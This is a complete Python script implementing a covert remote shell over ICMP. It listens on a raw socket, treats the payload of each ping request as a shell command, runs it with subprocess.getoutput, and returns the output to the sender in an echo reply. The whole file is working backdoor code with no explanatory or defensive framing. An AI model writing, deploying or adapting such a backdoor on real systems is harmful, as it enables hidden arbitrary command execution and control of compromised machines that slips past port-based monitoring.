import socket
import struct
import subprocess

def checksum(data):
    if len(data) % 2:
        data += b'\x00' 

    s = sum(data[i] + (data[i+1] << 8) for i in range(0, len(data), 2))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def create_reply_packet(identifier, sequence, payload):
    header = struct.pack('!BBHHH', 0, 0, 0, identifier, sequence)
    data = payload.encode()
    chksum = checksum(header + data)
    header = struct.pack('!BBHHH', 0, 0, chksum, identifier, sequence)
    return header + data

def verify_req_checksum(code, chksum, ident, seq, payload):
    header = struct.pack('!BBHHH', 8, code, 0, ident, seq)
    data = payload.encode()
    chksum_rslt = checksum(header + data)
    if chksum_rslt == chksum:
        return True
    return False


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    print("Waiting for ICMP packet...")
    while True:
        packet, addr = s.recvfrom(1024)
        icmp_header = packet[20:28]
        type, code, chksum, ident, seq = struct.unpack('!BBHHH', icmp_header)

        print(f"request checksum: {chksum}")
        if type == 8:
            print(f"[+] Ping from {addr[0]}")
            command = packet[28:].decode()
            if verify_req_checksum(code, chksum, ident, seq, command):
                output = subprocess.getoutput(command)
                reply = create_reply_packet(ident, seq, output)
                s.sendto(reply,(addr[0], 0))
            else:
                print("ICMP packet is corrupted")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("You shut down the server!")
